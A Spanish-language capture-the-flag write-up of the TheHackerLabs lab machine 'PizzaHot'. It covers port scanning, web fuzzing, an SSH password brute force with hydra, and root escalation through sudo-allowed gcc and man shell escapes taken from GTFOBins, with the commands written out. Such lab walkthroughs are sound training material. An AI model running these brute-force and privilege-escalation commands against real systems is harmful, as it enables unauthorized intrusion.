---
title: "PizzaHot - TheHackerLabs"
date: 2025-03-13
draft: false
slug: "THL-writeup-pizzahot"
excerpt: "Esta fue una máquina sencilla. Después de realizar los escaneos, vamos a analizar la página web activa. Analizando el código fuente, descubrimos un mensaje que nos da una pista de un posible usuario que podemos usar en el servicio SSH. Aplicamos fuerza bruta a este usuario y descubrimos su contraseña. Dentro del SSH, revisamos los privilegios de nuestro usuario, siendo que podemos usar el binario gcc como otro usuario. Utilizando la guía de GTFOBins, utilizaremos el binario gcc para escalar privilegios y convertirnos en ese nuevo usuario. Como el nuevo usuario, revisamos sus privilegios y descubrimos que puede usar el binario man como el usuario Root. Aprovechamos esto para escalar privilegios volviendo a utilizar la guía de GTFOBins y nos convertimos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Fuzzing", "Web Enumeration", "Information Leakage", "Brute Force Attack", "Abusing Sudoers Privileges", "User Pivoting", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "gobuster"
  - "BurpSuite"
  - "hydra"
  - "ssh"
  - "sudo"
  - "gcc"
  - "bash"
  - "man"
links:
  - "https://gtfobins.github.io/gtfobins/gcc/"
  - "https://gtfobins.github.io/gtfobins/man/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-pizzahot/pizzahot.webp"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.170
PING 192.168.1.170 (192.168.1.170) 56(84) bytes of data.
64 bytes from 192.168.1.170: icmp_seq=1 ttl=64 time=1.74 ms
64 bytes from 192.168.1.170: icmp_seq=2 ttl=64 time=0.904 ms
64 bytes from 192.168.1.170: icmp_seq=3 ttl=64 time=0.646 ms
64 bytes from 192.168.1.170: icmp_seq=4 ttl=64 time=0.817 ms

--- 192.168.1.170 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3060ms
rtt min/avg/max/mdev = 0.646/1.025/1.735/0.420 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.170 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 17:01 CST
Initiating ARP Ping Scan at 17:01
Scanning 192.168.1.170 [1 port]
Completed ARP Ping Scan at 17:01, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:01
Scanning 192.168.1.170 [65535 ports]
Discovered open port 80/tcp on 192.168.1.170
Discovered open port 22/tcp on 192.168.1.170
Completed SYN Stealth Scan at 17:01, 17.46s elapsed (65535 total ports)
Nmap scan report for 192.168.1.170
Host is up, received arp-response (0.00067s latency).
Scanned at 2025-03-13 17:01:13 CST for 18s
Not shown: 59970 closed tcp ports (reset), 5563 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
           Raw packets sent: 77340 (3.403MB) | Rcvd: 59974 (2.399MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solamente hay 2 puertos abiertos, ya veo por donde será la intrusión.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.170 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 17:01 CST
Nmap scan report for 192.168.1.170
Host is up (0.00079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 0a:55:60:9b:4a:38:07:dc:5b:42:ea:bd:bb:52:63:7f (ECDSA)
|_  256 e0:81:29:af:4e:2f:6a:55:8e:a0:02:1f:74:c7:fe:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Pizzahot
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

De acuerdo al escaneo, parece que podemos ver contenido en la página web. Además, no veo otra cosa que podamos hacer de momento.

Vamos a visitarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura1.png">
</p>

Se ve que tiene buen contenido la página.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura2.png">
</p>

Bien, pero no veo algo que podamos utilizar, aunque quizás las librerías que está ocupando puedan ser vulnerables.

Si bajamos, podemos encontrar los nombres de algunas personas:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura3.png">
</p>

Quizá sean usuarios del **servicio SSH**, así que tengámoslos en cuenta para más adelante.

#### Probando Formularios Book a Table y Contact {#formularios}

Revisando más abajo, podemos encontrar dos formularios, pero al probarlos, nos dará en ambos un error bastante curioso, ya que muestra en sí el script que se ejecuta en dichos formularios.

Esta es la prueba del formulario **Book a Table**:
<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura4.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura5.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura6.png">
</p>

Esta es la prueba del formulario **Contact**:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura7.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura8.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura9.png">
</p>

Por lo que entiendo, parece que se estaba intentando implementar un servidor que reciba estos formularios mediante el **protocolo SMTP**.

De momento, no veo que nos sirvan de algo, por lo que los descartamos.

#### Revisando Código Fuente de la Página Web {#cFuente}

Si revisamos el código fuente de la página web, encontraremos un curioso mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura10.png">
</p>

Nos acaban de dar un posible usuario que podemos probar para aplicarle fuerza bruta.

Antes de comprobarlo, apliquemos **Fuzzing** por si algo se nos escapa.

### Fuzzing {#fuzz}

```bash
gobuster dir -u http://192.168.1.170/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -x html,txt,php,cgi,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.170/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php,cgi,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 47583]
/assets               (Status: 301) [Size: 317] [--> http://192.168.1.170/assets/]
/forms                (Status: 301) [Size: 316] [--> http://192.168.1.170/forms/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.1.170/javascript/]
/Readme.txt           (Status: 200) [Size: 221]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1323270 / 1323276 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Curiosamente, la herramienta **wfuzz** no me funciono correctamente, no sé porque razón, pero es bueno siempre conocer más de una herramienta para un propósito específico.

Resulta que hay dos directorios que podemos visitar, siendo que ambos almacenan toda la estructura de la página web.

Pero, el directorio `/forms` tiene dos scripts que parece son los que realizan el funcionamiento de los formularios:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura12.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura13.png">
</p>

Como mencione antes, no nos sirven, pero es un dato importante que pudimos encontrar y probar.

Ahora sí, vamos a probar el usuario que encontramos.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Usuario pizzapiña de Servicio SSH {#SSH}

Vamos a comprobar si este usuario existe, al aplicarle fuerza bruta con la herramienta **hydra**:
```bash
hydra -l 'pizzapiña' -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.170 -t 48
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-13 17:06:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 48 tasks per 1 server, overall 48 tasks, 14344399 login tries (l:1/p:14344399), ~298842 tries per task
[DATA] attacking ssh://192.168.1.170:22/
[22][ssh] host: 192.168.1.170   login: pizzapiña   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 17 final worker threads did not complete until end.
[ERROR] 17 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-13 17:06:57
```
Excelente, si existe y pudimos obtener su contraseña.

Vamos a conectarnos al **servicio SSH**:
```bash
ssh pizzapiña@192.168.1.170
pizzapiña@192.168.1.170's password: 
Linux pizzahot 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
...
...
Last login: Tue May 28 19:44:53 2024
pizzapiña@pizzahot:~$ whoami
pizzapiña
```
Estamos dentro.

Pero al tratar de obtener la flag, tenemos un mensaje:
```bash
pizzapiña@pizzahot:~$ cat user.txt 
sigue buscando
```
Parece que la flag se encuentra en otro lado.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#enumLin}

Primero, vamos a revisar que privilegios tenemos:
```bash
pizzapiña@pizzahot:~$ sudo -l
[sudo] contraseña para pizzapiña: 
Matching Defaults entries for pizzapiña on pizzahot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pizzapiña may run the following commands on pizzahot:
    (pizzasinpiña) /usr/bin/gcc
```
Parece que podemos usar el **binario gcc** como el **usuario pizzasinpiña**.

Si revisamos el directorio `/home`, ahí encontraremos el directorio de este usuario:
```bash
pizzapiña@pizzahot:~$ ls -la /home
total 16
drwxr-xr-x  4 root         root         4096 may 28  2024 .
drwxr-xr-x 18 root         root         4096 may 28  2024 ..
drwxr-xr-x  2 pizzapiña    pizzapiña    4096 may 28  2024 pizzapiña
drwxr-xr-x  2 pizzasinpiña pizzasinpiña 4096 may 28  2024 pizzasinpiña
```
Curiosamente, podemos entrar y revisar su contenido.

Observa lo que encontramos:
```bash
pizzapiña@pizzahot:~$ cd ../pizzasinpiña/
pizzapiña@pizzahot:/home/pizzasinpiña$ ls -la
total 28
drwxr-xr-x 2 pizzasinpiña pizzasinpiña 4096 may 28  2024 .
drwxr-xr-x 4 root         root         4096 may 28  2024 ..
lrwxrwxrwx 1 root         root            9 may 28  2024 .bash_history -> /dev/null
-rw-r--r-- 1 pizzasinpiña pizzasinpiña  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 pizzasinpiña pizzasinpiña 3526 abr 23  2023 .bashrc
-rw------- 1 pizzasinpiña pizzasinpiña   38 may 28  2024 .lesshst
-rw-r--r-- 1 pizzasinpiña pizzasinpiña  807 abr 23  2023 .profile
-rw-r--r-- 1 pizzasinpiña pizzasinpiña   33 may 28  2024 user.txt
pizzapiña@pizzahot:/home/pizzasinpiña$ cat user.tx
...
```
Ahí está la flag y podemos verla.

### Escalando Privilegios con Binario gcc para Convertirnos en Usuario pizzasinpiña {#gcc}

Si revisamos la guía de **GTFOBins**, encontraremos una forma con la que podemos escalar privilegios con el **binario gcc**:
* <a href="https://gtfobins.github.io/gtfobins/gcc/" target="_blank">GTFOBins: binario gcc</a>

Vamos a utilizar el último comando:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura14.png">
</p>

Probémoslo:
```bash
pizzapiña@pizzahot:~$ sudo -u pizzasinpiña gcc -wrapper /bin/sh,-s .
$ whoami
pizzasinpiña
$ /bin/bash -i
pizzasinpiña@pizzahot:/home/pizzapiña$
```
Excelente, ahora somos el **usuario pizzasinpiña**.

### Escalando Privilegios con Binario man para Convertirnos en Usuario Root {#man}

Vamos a revisar si este usuario también tiene algún privilegio:
```bash
pizzasinpiña@pizzahot:~$ sudo -l
Matching Defaults entries for pizzasinpiña on pizzahot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pizzasinpiña may run the following commands on pizzahot:
    (root) NOPASSWD: /usr/bin/man
    (ALL) NOPASSWD: /usr/bin/sudo -l
```
Muy bien, podemos utilizar el **binario man** como el **usuario Root**.

También lo podemos buscar en la guía de **GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/man/" target="_blank">GFTOBins: binario man</a>

Vamos a utilizar el último comando:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura15.png">
</p>

Probémoslo:
```bash
pizzasinpiña@pizzahot:~$ sudo man man
```

Bien, ahora ejecutamos la **Bash**:

<p align="center">
<img src="/assets/images/THL-writeup-pizzahot/Captura16.png">
</p>

Y listo, ya somos **Root**:
```bash
# whoami
root
# /bin/bash -i
root@pizzahot:/home/pizzasinpiña#
```

Ya solamente queda obtener la última flag:
```bash
root@pizzahot:/home/pizzasinpiña# cd /root
root@pizzahot:~# ls
root.txt
root@pizzahot:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
